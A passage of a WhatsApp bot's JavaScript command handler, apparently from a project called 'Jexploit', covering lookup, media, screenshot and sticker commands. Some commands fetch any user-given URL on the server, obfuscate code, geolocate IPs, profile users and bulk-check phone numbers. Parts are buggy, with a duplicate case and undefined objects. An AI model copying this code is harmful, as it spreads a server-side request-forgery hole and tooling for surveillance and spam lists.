    if (!text) return reply(`🍎 *Fruit Information*\n\nPlease provide a fruit name.\n\nExample:\n${prefix}fruit apple\n${prefix}fruitinfo banana\n${prefix}fruit orange`);

    const fruitName = text.trim().toLowerCase();
    
    // Send processing message
    await reply(`🔍 Searching for information about: *${fruitName}*...`);
    await conn.sendMessage(m.chat, { react: { text: '🍊', key: m.key } });

    try {
        // Call the fruit API
        const apiUrl = `https://apiskeith.top/education/fruit?q=${encodeURIComponent(fruitName)}`;
        const response = await axios.get(apiUrl, { timeout: 10000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result) {
            throw new Error('Invalid API response');
        }

        const fruit = response.data.result;
        
        // Format the fruit information
        let fruitText = `🍎 *Fruit: ${fruit.name}*\n\n`;
        fruitText += `📚 *Scientific Classification*\n`;
        fruitText += `• Family: ${fruit.family || 'N/A'}\n`;
        fruitText += `• Genus: ${fruit.genus || 'N/A'}\n`;
        fruitText += `• Order: ${fruit.order || 'N/A'}\n\n`;
        
        // Add nutrition information if available
        if (fruit.nutritions) {
            fruitText += `*Nutrition Facts (per 100g)*\n`;
            fruitText += `• Calories: ${fruit.nutritions.calories || 0} kcal\n`;
            fruitText += `• Fat: ${fruit.nutritions.fat || 0}g\n`;
            fruitText += `• Sugar: ${fruit.nutritions.sugar || 0}g\n`;
            fruitText += `• Carbohydrates: ${fruit.nutritions.carbohydrates || 0}g\n`;
            fruitText += `• Protein: ${fruit.nutritions.protein || 0}g\n`;
        }

        await conn.sendMessage(m.chat, { text: fruitText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Fruit API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = `❌ Could not find information for "${fruitName}". `;
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else if (error.response?.status === 404) {
            errorMsg = `❌ No information found for "${fruitName}". Please check the spelling.`;
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case 'book':
case 'booksearch': {
    if (!text) return reply(`📚 *Book Search*\n\nPlease provide a book title to search.\n\nExample:\n${prefix}book a doll's house\n${prefix}booksearch harry potter\n${prefix}book moby dick`);

    const query = text.trim();
    
    // Send processing message
    await reply(`🔍 Searching for books: *${query}*...`);
    await conn.sendMessage(m.chat, { react: { text: '📚', key: m.key } });

    try {
        // Call the book search API
        const apiUrl = `https://apiskeith.top/education/booksearch?q=${encodeURIComponent(query)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result || response.data.result.length === 0) {
            throw new Error('No books found');
        }

        const books = response.data.result;
        
        // Format the results
        let bookText = `📚 *Book Search Results for "${query}"*\n\n`;
        bookText += `━━━━━━━━━━━━━━━━━━\n\n`;
        
        // Show first 3 books to avoid long messages
        const maxBooks = Math.min(books.length, 3);
        
        for (let i = 0; i < maxBooks; i++) {
            const book = books[i];
            
            bookText += `📖 *${i+1}. ${book.title}*\n`;
            
            // Add authors
            if (book.authors && book.authors.length > 0) {
                const authorNames = book.authors.map(a => a.name).join(', ');
                bookText += `✍️ *Author:* ${authorNames}\n`;
            }
            
            // Add brief summary (truncated)
            if (book.summary) {
                const shortSummary = book.summary.length > 200 
                    ? book.summary.substring(0, 200) + '...' 
                    : book.summary;
                bookText += `📝 *Summary:* ${shortSummary}\n`;
            }
            
            // Add key metadata
            bookText += `📊 *Downloads:* ${book.downloadCount?.toLocaleString() || 0}\n`;
            bookText += `🔤 *Language:* ${book.languages?.join(', ') || 'en'}\n`;
            
            // Add subjects/topics (first 2)
            if (book.subjects && book.subjects.length > 0) {
                const subjects = book.subjects.slice(0, 2).join(' • ');
                bookText += `🏷️ *Topics:* ${subjects}`;
                if (book.subjects.length > 2) bookText += ` +${book.subjects.length - 2} more`;
                bookText += `\n`;
            }
            
            bookText += `\n━━━━━━━━━━━━━━━━━━\n\n`;
        }
        
        if (books.length > 3) {
            bookText += `_...and ${books.length - 3} more results. Search more specifically for detailed results._`;
        }

        await conn.sendMessage(m.chat, { text: bookText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Book Search API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = `❌ No books found for "${query}". `;
        if (error.message.includes('timeout')) {
            errorMsg = '❌ Request timed out. Please try again.';
        } else if (error.message.includes('No books found')) {
            errorMsg = `❌ No books found matching "${query}". Try a different title.`;
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case "helpers": {
    const search = (args && args.length) ? args.join(" ").toLowerCase() : "";

// Check if global.helpersList exists and is an array
const helpersList = Array.isArray(global.mess.helpersList) ? global.mess.helpersList : [];

const filtered = helpersList.filter(helper =>
    helper && helper.country && (helper.country.toLowerCase().includes(search))
);

if (!filtered.length) {
    return reply(`x No helper found for "${search}".\nTry using: *.helpers* to see all.`);
}
    filtered.sort((a, b) => (a.country || "").localeCompare(b.country || ""));

    let text = `*🌍 Jexploit Verified Helpers*\n\n`;
    filtered.forEach((helper, index) => {
      text += `${index + 1}. ${helper.flag || ""} *${helper.country || "N/A"}*\n   • ${helper.name || "N/A"}: ${helper.number || "N/A"}\n\n`;
    });

    text += `✅ Jexploit Team\n`;
    text += `📢 For more information and updates? Join our support group:\n👉 https://chat.whatsapp.com/IixDQqcKOuE8eKGHmQqUod?mode=ems_copy_c\n`;
    text += `⚠️ Charges may apply depending on the service provided.`;

    reply(text);
}
break
case "flux": {
   try {
if (!text) return reply(`*Usage:* ${command} <prompt>\n\n*Example:* ${command} cat`);
    

    await reply('> *Jexploit ᴘʀᴏᴄᴇssɪɴɢ ɪᴍᴀɢᴇ...*');

    const apiUrl = `https://apis.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;

    await conn.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🎨 *FLUX IMAGE GENERATOR*\n\n📄 *PROMPT:* ${text}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Jexploit` }, { quoted: m });
  } catch (error) {
    console.error('Error in Flux command:', error);
    reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
      }
}
break
case 'tomp3':
case "toaudio": {
const quoted = m.quoted ? m.quoted : null;
  const mime = quoted?.mimetype || "";
    if (!quoted) return reply('*Reply to a video to convert it to audio!*');
    if (!/video/.test(mime)) return reply('*Only videos can be converted to audio!*');

    try {
      let buffer = await quoted.download();
      let converted = await toAudio(buffer, 'mp4');

      await conn.sendMessage(m.chat, { audio: converted.data, mimetype: 'audio/mpeg' }, { quoted: m });
      await converted.delete();
    } catch (e) {
      console.error(e);
      reply('*Failed to convert video to audio!*');
    }
}
break
case "tovideo": {
 if (!m.quoted) return reply(`Reply to a sticker with caption *${prefix + command}*`);
    if (!m.quoted.mimetype.includes('webp')) return reply(`Please reply to a webp sticker`);
    
    try {
      const media = await m.quoted.download();
      const videoUrl = await webp2mp4(media);
      
      if (!videoUrl) throw new Error('Conversion failed');
      
      await conn.sendFile(m.chat, videoUrl, 'converted.mp4', '', m);
      
    } catch (error) {
      console.error(error);
      reply('❌ Failed to convert sticker to video. Please try again later.');
    }
}

break
case 'trackip': {
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};

if (!res.success) throw new Error(`IP ${text} not found!`);
await dave.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
 break    
  case "tts": {
  if(!text) return m.reply("`provide a query`");
  m.reply(`processing your query`);
  try {
    let anu = `https://api.siputzx.my.id/api/tools/tts?text=${encodeURIComponent(text)}&voice=jv-ID-DimasNeural&rate=0%&pitch=0Hz&volume=0%`;
    const response = await axios.get(anu, {
      responseType: 'arraybuffer'
    });
    let buffer = response.data;

    conn.sendMessage(m.chat, {
      audio: buffer,
      mimetype: "audio/mpeg",
      mp3: true
    })
  } catch (err) {
    console.log(err);
    return err;
  }
}
break;
  //========================================================\\    
case "xvideos":{
    if (!q) return m.reply(`Example: ${prefix + command} anime`);
    m.reply(mess.wait);
const axios = require('axios');    
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(q)}`;
        const { data } = await axios.get(apiUrl);

        if (!data.status) return m.reply("Failed to fetch search results");

        let resultText = `*XNXX SEARCH RESULTS*\n`;
        resultText += `*Query:* ${q}\n`;
        resultText += `*Found:* ${data.result.length} videos\n\n`;

        const maxResults = 10;
        const displayResults = data.result.slice(0, maxResults);

        displayResults.forEach((video, index) => {
            resultText += `*${index + 1}. ${video.title}*\n`;
            resultText += `Info: ${video.info.trim()}\n`;
            resultText += `Link: ${video.link}\n\n`;
        });

        if (data.result.length > maxResults) {
            resultText += `_And ${data.result.length - maxResults} more results..._\n`;
            resultText += `_Use ${prefix}xnxxdown [link] to download any video_`;
        }

        await conn.sendMessage(m.chat, {
            text: resultText
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
    }
 break
//======[OTHER MENU CMDS]===
case "sswebtab": {
const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `https://api.tioo.eu.org/sstab?url=${q}`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred.");
    }
}
break 
case "ss2": {
 const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=mobile`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred while generating the image.");
    }
}
break
case "ss": {
try {
    const url = args[0];
    if (!url) return reply("❌ Please provide a URL\nExample: .screenshot https://google.com");
    if (!url.startsWith("http")) return reply("❌ URL must start with http:// or https://");

    // ASCII loading bars with percentage
    const loadingBars = [
        { percent: 10, bar: "[▓░░░░░░░░░]", text: "✦ Initializing capture..." },
        { percent: 20, bar: "[▓▓░░░░░░░░]", text: "✦ Connecting to website..." },
        { percent: 30, bar: "[▓▓▓░░░░░░░]", text: "✦ Loading page content..." },
        { percent: 40, bar: "[▓▓▓▓░░░░░░]", text: "✦ Rendering elements..." },
        { percent: 50, bar: "[▓▓▓▓▓░░░░░]", text: "✦ Processing JavaScript..." },
        { percent: 60, bar: "[▓▓▓▓▓▓░░░░]", text: "✦ Capturing viewport..." },
        { percent: 70, bar: "[▓▓▓▓▓▓▓░░░]", text: "✦ Scrolling page..." },
        { percent: 80, bar: "[▓▓▓▓▓▓▓▓░░]", text: "✦ Finalizing screenshot..." },
        { percent: 90, bar: "[▓▓▓▓▓▓▓▓▓░]", text: "✦ Optimizing image..." },
        { percent: 100, bar: "[▓▓▓▓▓▓▓▓▓▓]", text: "✓ Capture complete!" }
    ];

    // Send initial message
    const loadingMsg = await conn.sendMessage(from, {
        text: "🔄 Starting screenshot capture...\n✦ Please wait..."
    }, { quoted: mek });

    // Animate loading progress
    for (const frame of loadingBars) {
        await sleep(800);
        await conn.relayMessage(from, {
            protocolMessage: {
                key: loadingMsg.key,
                type: 14,
                editedMessage: {
                    conversation: `📸 ${frame.bar} ${frame.percent}%\n${frame.text}`
                }
            }
        }, {});
    }

    // Final update before sending
    await sleep(800);
    await conn.relayMessage(from, {
        protocolMessage: {
            key: loadingMsg.key,
            type: 14,
            editedMessage: {
                conversation: "✅ Screenshot Captured!\n✦ Sending now..."
            }
        }
    }, {});

    await sleep(1000);

    // Send the actual screenshot
    await conn.sendMessage(from, {
        image: { url: `https://image.thum.io/get/fullpage/${url}` },
        caption: "- 🖼️ *Screenshot Generated*\n\n" +
                `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${global.botname}💪 💜`
    }, { quoted: mek });

  } catch (error) {
    console.error("Error:", error);
    reply("❌ Failed to capture screenshot\n✦ Please try again later");
  }
}
break
case "sswebpc": {
const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=tablet`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred.");
    }
}
break
case "obfuscate": {
//  this is directory creation code
const tmpDir = './tmp';
if (!fs.existsSync(tmpDir)) {
    fs.mkdirSync(tmpDir, { recursive: true });
}
const quoted = m.quoted ? m.quoted : null;
  const mime = quoted?.mimetype || "";

  if (!quoted || mime !== "application/javascript") {
  return conn.sendMessage(m.chat, { text: "❌ *Error:* Reply to a `.js` file with `.obfuscate`!" }, { quoted: m });
          }
  try {
  const media = await quoted.download();
  const tempFile = `./tmp/original-${Date.now()}.js`;
  await fs.promises.writeFile(tempFile, media);

  conn.sendMessage(m.chat, { text: "🔒 Obfuscation started..." }, { quoted: m });

  const obfuscatedFile = await obfuscateJS(tempFile);

  await conn.sendMessage(m.chat, { text: "✅ Obfuscation complete! Sending file..." }, { quoted: m }); 
 
  await conn.sendMessage(m.chat, { document: fs.readFileSync(obfuscatedFile), mimetype: "text/javascript", fileName: "obfuscated.js" });

  await fs.promises.unlink(tempFile);
  await fs.promises.unlink(obfuscatedFile);
   } catch (error) {
  conn.sendMessage(from, { text: `❌ *Error:* ${error.message}` }, { quoted: m });
        } 

}
break
case 'obfuscate2':
case 'obfus':
case 'encrypt': {
    if (!text) return reply(`*Usage:* ${prefix}obfuscate <code>\n*Example:* ${prefix}obfuscate console.log("Hello World")`);
    
    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        // Encode the code for the URL
        const encodedCode = encodeURIComponent(text);
        
        // API endpoint
        const apiUrl = `https://api.giftedtech.co.ke/api/tools/encryptv2?apikey=gifted&code=${encodedCode}`;
        
        console.log("Obfuscate: Making API request to:", apiUrl);
        
        // Fetch the obfuscated code
        const response = await fetch(apiUrl);
        const data = await response.json();
        
        console.log("Obfuscate: API Response:", JSON.stringify(data, null, 2));
        
        let obfuscatedCode = '';
        
        // FIX: Properly handle different response formats
        if (data && typeof data === 'object') {
            if (data.result && typeof data.result === 'string') {
                obfuscatedCode = data.result;
            } else if (data.encrypted && typeof data.encrypted === 'string') {
                obfuscatedCode = data.encrypted;
            } else if (data.code && typeof data.code === 'string') {
                obfuscatedCode = data.code;
            } else if (data.data && typeof data.data === 'string') {
                obfuscatedCode = data.data;
            } else if (data.message && typeof data.message === 'string') {
                obfuscatedCode = data.message;
            } else {
                // If we get an object but can't find the string, try to stringify it
                obfuscatedCode = JSON.stringify(data, null, 2);
                console.warn("Obfuscate: Unexpected response format, using JSON stringify");
            }
        } else if (typeof data === 'string') {
            obfuscatedCode = data;
        } else {
            throw new Error('Unexpected response format from API');
        }
        
        // Validate that we actually got obfuscated code
        if (!obfuscatedCode || obfuscatedCode.trim() === '') {
            throw new Error('API returned empty result');
        }
        
        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });
        
        // Truncate long code for display
        const displayOriginal = text.length > 500 ? text.substring(0, 500) + '...' : text;
        const displayObfuscated = obfuscatedCode.length > 1500 ? obfuscatedCode.substring(0, 1500) + '...' : obfuscatedCode;
        
        // Send the obfuscated code
        await conn.sendMessage(m.chat, {
            text: `*🔒 OBFUSCATED CODE*\n\n*Original Code:*\n\`\`\`javascript\n${displayOriginal}\n\`\`\`\n\n*Obfuscated Code:*\n\`\`\`javascript\n${displayObfuscated}\n\`\`\`\n\n*📝 Note:* Code has been obfuscated successfully!`,
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    title: "🔒 Code Obfuscator",
                    body: "Powered by GiftedTech API",
                    thumbnail: peler,
                    sourceUrl: 'https://api.giftedtech.co.ke'
                }
            }
        }, { quoted: m });
        
    } catch (error) {
        console.error('Obfuscate Error:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });
        
        reply(`❌ *Failed to obfuscate code!*\nError: ${error.message}\n\nPlease try again with different code or try later.`);
    }
}
break
case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return reply(`Username? `)
let res = await fg.ttStalk(args[0])
let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
await conn.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
//======[CONVERT MENU CMDS]===
break 
case 's':
case "sticker": {
const quoted = m.quoted || m.msg?.quoted;
    if (!quoted) {
      return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
    }

    const mime = quoted.mimetype || quoted.msg?.mimetype;
    if (!mime) {
      return reply(`The quoted message does not contain media. Please send or reply to an image, video, or gif.`);
    }

    const swns = args.join(" ");
    const pcknms = swns.split("|")[0];
    const atnms = swns.split("|")[1];

    try {
      if (/image/.test(mime)) {
        const media = await quoted.download();
        await conn.sendImageAsSticker(m.chat, media, m, {
          packname: pcknms ? pcknms : global.packname,
          author: atnms ? atnms : global.author,
        });
      }
      else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 10) {
          return reply("The video length must be 10 seconds or less. Please try again.");
        }
        const media = await quoted.download();
        await conn.sendVideoAsSticker(m.chat, media, m, {
          packname: pcknms ? pcknms : global.packname,
          author: atnms ? atnms : global.author,
        });
      }
    
      else {
        return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
      }
    } catch (error) {
      console.error('Error processing sticker:', error);
      reply('An error occurred while processing the sticker.');
    }
}
break
case 'tomp3':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`tag/reply Video/Audio with Caption ${prefix + command}`)
let media = await conn.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
bot.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})
}
break
case "topdf":
case "pdf": {
try {
        if (!q) return reply("Please provide the text you want to convert to PDF. *Eg* `.topdf` *Kevin Ug🇺🇬*");

        // Create a new PDF document
        const doc = new PDFDocument();
        let buffers = [];
        doc.on('data', buffers.push.bind(buffers));
        doc.on('end', async () => {
            const pdfData = Buffer.concat(buffers);

            // Send the PDF file
            await conn.sendMessage(from, {
                document: pdfData,
                mimetype: 'application/pdf',
                fileName: 'Jexploit .pdf',
                caption: `${global.wm}`
            }, { quoted: mek });
        });

        // Add text to the PDF
        doc.text(q);

        // Finalize the PDF and end the stream
        doc.end();

    } catch (e) {
        console.error(e);
        reply(`Error: ${e.message}`);
    }
} 
break
case "fliptext": {
    if (args.length < 1) return reply(`*Example:\n${prefix}fliptext Kelvin*`);
    
    let quere = args.join(" ");
    let flipe = quere.split("").reverse().join("");
    
    reply(`Normal:\n${quere}\nFlip:\n${flipe}`);
}
break
case 'telesticker':
case 'tsticker': {
    await telestickerCommand(conn, m.chat, m, args);
    
}
break
case 'take':
case 'steal': {
    await takeCommand(conn, m.chat, m, args);    
}
break
case "take2": {
if (!m.quoted) return reply('Please reply to a sticker to add watermark or metadata.');

    try {
      let stick = args.join(" ").split("|");
      let packName = stick[0] && stick[0].trim() !== "" ? stick[0] : pushname || global.packname;
      let authorName = stick[1] ? stick[1].trim() : "";
      let mime = m.quoted.mimetype || '';
      if (!/webp/.test(mime)) return reply('Please reply to a sticker.');

      let stickerBuffer = await m.quoted.download();
      if (!stickerBuffer) return reply('Failed to download the sticker. Please try again.');

      let stickerWithExif = await addExif(stickerBuffer, packName, authorName);

      if (stickerWithExif) {
        await conn.sendFile(
          m.chat,
          stickerWithExif,
          'sticker.webp',
          '',
          m,
          null,
          { mentions: [m.sender] }
        );
      } else {
        throw new Error('Failed to process the sticker with metadata.');
      }
    } catch (error) {
      console.error('Error in watermark/sticker metadata plugin:', error);
      reply('An error occurred while processing the sticker.');
    }
}
break
case "qrcode": {
if (!text) return reply("Enter text or URL");

    try {
      let res = await fetch(`https://api.qrserver.com/v1/create-qr-code/?data=${text}&size=200x200`);
      let qrCodeUrl = res.url;

      await conn.sendMessage(m.chat, { image: { url: qrCodeUrl } }, { quoted: m });
    } catch (error) {
      console.error('Error generating QR code:', error);
      reply('An error occurred while generating the QR code.');
    }
}
break
case "getdevice": {
   if (!m.quoted) {
      return reply('*Please quote a message to use this command!*');
    }
    
    console.log('Quoted Message:', m.quoted);
console.log('Quoted Key:', m.quoted?.key);

    try {
      const quotedMsg = await m.getQuotedMessage();

      if (!quotedMsg) {
        return reply('*Could not detect, please try with newly sent message!*');
      }

      const messageId = quotedMsg.key.id;

      const device = getDevice(messageId) || 'Unknown';

      reply(`The message is sent from *${device}* device.`);
    } catch (err) {
      console.error('Error determining device:', err);
      reply('Error determining device: ' + err.message);
    }
}
break
case "browse": {
if (!text) return reply("Enter URL");

    try {
      let res = await fetch(text);

      if (res.headers.get('Content-Type').includes('application/json')) {
        let json = await res.json();
        await conn.sendMessage(m.chat, { text: JSON.stringify(json, null, 2) }, { quoted: m });
      } else {
        let resText = await res.text();
        await conn.sendMessage(m.chat, { text: resText }, { quoted: m });
      }

      if (!res.ok) throw new Error(`HTTP Error ${res.status}`);
    } catch (error) {
      reply(`Error fetching URL: ${error.message}`);
    }
}
break
case "filtervcf": {
const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";
    const normalizePhoneNumber = (phone) => {
      if (!phone || typeof phone !== 'string') return null;
      return phone.replace(/\D/g, '');
    };

    if (!quoted || !(mime === "text/vcard" || mime === "text/x-vcard")) {
      return conn.sendMessage(m.chat, { 
        text: "❌ *Error:* Reply to a `.vcf` file with `.filtervcf` or `.cleanvcf`!" 
      }, { quoted: m });
    }

    try {
      const media = await quoted.download();
      const vcfContent = media.toString('utf8');
      
      await conn.sendMessage(m.chat, { 
        text: "🔍 Filtering VCF - checking WhatsApp numbers, this may take a while..." 
      }, { quoted: m });

      const vCards = vcfContent.split('END:VCARD')
        .map(card => card.trim())
        .filter(card => card.length > 0);

      const validContacts = [];
      const invalidContacts = [];
      let processed = 0;

      for (const card of vCards) {
        try {
          const telMatch = card.match(/TEL[^:]*:([^\n]+)/);
          if (!telMatch) continue;
          
          const phoneRaw = telMatch[1].trim();
          const phoneNumber = normalizePhoneNumber(phoneRaw);
          if (!phoneNumber) continue;

          const jid = `${phoneNumber}@s.whatsapp.net`;
          const result = await conn.onWhatsApp(jid);
          
          if (result.length > 0 && result[0].exists) {
            validContacts.push(card);
          } else {
            invalidContacts.push(phoneNumber);
          }
        } catch (error) {
          console.error('Error processing contact:', error);
        }
      }

      const filteredVcf = validContacts.join('\nEND:VCARD\n') + (validContacts.length > 0 ? '\nEND:VCARD' : '');
      
      const resultMessage = `✅ *VCF Filtering Complete*\n\n` +
        `• Total contacts: ${vCards.length}\n` +
        `• Valid WhatsApp contacts: ${validContacts.length}\n` +
        `• Non-WhatsApp numbers removed: ${invalidContacts.length}\n\n` +
        `Sending filtered VCF file...`;

      await conn.sendMessage(m.chat, { text: resultMessage }, { quoted: m });

      await conn.sendMessage(m.chat, { 
        document: Buffer.from(filteredVcf), 
        mimetype: "text/x-vcard", 
        fileName: "filtered_contacts.vcf" 
      });

    } catch (error) {
      await conn.sendMessage(from, { 
        text: `❌ *Error:* ${error.message}` 
      }, { quoted: m });
    }
}
break
case 'removebg':
case 'nobg':
case 'rmbg': {
    if (!text && !(m.quoted && (m.quoted.mtype === 'imageMessage' || m.quoted.mtype === 'stickerMessage'))) {
        return reply(`Usage: ${prefix}removebg <image_url> or reply to an image with ${prefix}removebg`);
    }
    
    try {
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        
        let imageUrl = text ? text.trim() : '';
        
        // Handle quoted image
        if (m.quoted && (m.quoted.mtype === 'imageMessage' || m.quoted.mtype === 'stickerMessage')) {
            try {
                const media = await m.quoted.download();
                // Convert to base64 and upload to Telegra.ph
                const base64Image = media.toString('base64');
                const telegraphResponse = await fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: JSON.stringify({ data: base64Image }),
                    headers: { 'Content-Type': 'application/json' }
                });
                
                const telegraphData = await telegraphResponse.json();
                if (telegraphData[0] && telegraphData[0].src) {
                    imageUrl = 'https://telegra.ph' + telegraphData[0].src;
                } else {
                    throw new Error('Telegra.ph upload failed');
                }
            } catch (uploadError) {
                console.error('Upload error:', uploadError);
                return reply('❌ Failed to upload image. Please provide a direct image URL instead.');
            }
        }
        
        // Validate URL
        if (!imageUrl.startsWith('http')) {
            return reply('❌ Please provide a valid image URL');
        }
        
        const apiUrl = `https://api.giftedtech.co.ke/api/tools/removebg?apikey=gifted&url=${encodeURIComponent(imageUrl)}`;
        
        console.log('Processing image:', imageUrl);
        
        const response = await fetch(apiUrl);
        const apiData = await response.json();
        
        if (!apiData.success || !apiData.result?.image_url) {
            return reply('❌ Background removal failed. Make sure the image URL is accessible.');
        }

        const result = apiData.result;
        const imageBuffer = await getBuffer(result.image_url);
        
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `✅ *Background Removed*\n\n📁 Size: ${result.size || 'N/A'}\n👤 By: ${pushname}`,
            mentions: [m.sender]
        }, { quoted: m });

        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        
    } catch (error) {
        console.error('RemoveBG Error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(`❌ Error: ${error.message}`);
    }
    
}
break
case "styletext": {
if (!text) return reply('*Enter a text!*');
    
    try {
      let anu = await styletext(text);
      let teks = `Styles for ${text}\n\n`;
      
      for (let i of anu) {
        teks += `□ *${i.name}* : ${i.result}\n\n`;
      }
      
      reply(teks);
    } catch (error) {
      console.error(error);
      reply('*An error occurred while fetching fancy text styles.*');
    }
}
break
case "tourl":   case "url": {
const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;

    if (!quoted || !mime) {
      return reply('*Please reply to a media message!*');
    }

    try {
      const mediaUrl = await handleMediaUpload(quoted, conn, mime);
      reply(`*Uploaded successfully:*\n${mediaUrl}`);
    } catch (error) {
      console.error(error);
      reply('*An error occurred while uploading the media.*');
    }
}
break
case "userinfo":
case "ui": {
    try {
        let targetUser;
        
        // Determine the target user
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            targetUser = m.mentionedJid[0];
        } else if (m.quoted && m.quoted.sender) {
            targetUser = m.quoted.sender;
        } else if (text) {
            // Extract numbers from text
            const numbers = text.match(/\d+/g);
            if (numbers && numbers.length > 0) {
                targetUser = numbers[0] + '@s.whatsapp.net';
            } else {
                targetUser = m.sender; // Use sender if no valid number found
            }
        } else {
            targetUser = m.sender; // Default to sender
        }

        // Validate the target user format
        if (!targetUser.includes('@s.whatsapp.net')) {
            targetUser = targetUser.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        }

        // Get user info with proper error handling
        const userJid = targetUser;
        
        // Get basic user info
        const [usernameResult, userDataResult] = await Promise.allSettled([
            conn.getName(userJid).catch(() => 'Unknown'),
            conn.onWhatsApp(userJid).catch(() => [])
        ]);

        const username = usernameResult.status === 'fulfilled' ? usernameResult.value : 'Unknown';
        const userData = userDataResult.status === 'fulfilled' && userDataResult.value.length > 0 ? 
                        userDataResult.value[0] : null;

        // Check if user exists on WhatsApp
        if (!userData || userData.exists !== true) {
            return reply('❌ *This user is not registered on WhatsApp or the number is invalid.*');
        }

        // Get additional info with error handling
        const [profilePicture, aboutInfo, isBusiness, isBlocked] = await Promise.allSettled([
